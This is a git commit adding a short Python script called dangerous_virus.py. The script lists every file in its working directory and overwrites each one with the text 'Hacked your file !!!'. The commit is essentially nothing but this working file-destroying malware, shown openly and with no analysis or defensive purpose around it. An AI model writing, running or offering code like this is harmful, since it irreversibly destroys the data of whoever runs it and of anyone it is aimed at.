aef9f5cfdd32ac7c22b73ca5ebc3fe31e5e5d471
ROHIT VISHWAKARMA <52505486+ROHIT25082000@users.noreply.github.com>
2020-04-17 13:45:26 +0530

    Add files via upload
    Added the main file

---
+++ dangerous_virus.py
@@ -0,0 +1,23 @@
+import subprocess
+import re
+subprocess.run("ls >index.dat",shell = True)
+fp = open("index.dat","r")
+mydestroyList = fp.read()
+mydestroyList = re.split("\\n| ",mydestroyList)
+mydestroyList.remove("index.dat")
+mydestroyList.remove("dangerous_virus.py")
+fp.close()
+
+for filek in mydestroyList:
+	if filek != "deadly.py" and filek != "index.dat":
+		try:
+			fpp = open(filek,"w")
+			fpp.write("Hacked your file !!!")
+			fpp.close()
+		except FileNotFoundError:
+  			print("!@#$%^&^%$#@#$%^%$# \nFiles Corrupted !!!!")
+		except:
+  			print("Files Corrupted !!!!")
+		
+		
+
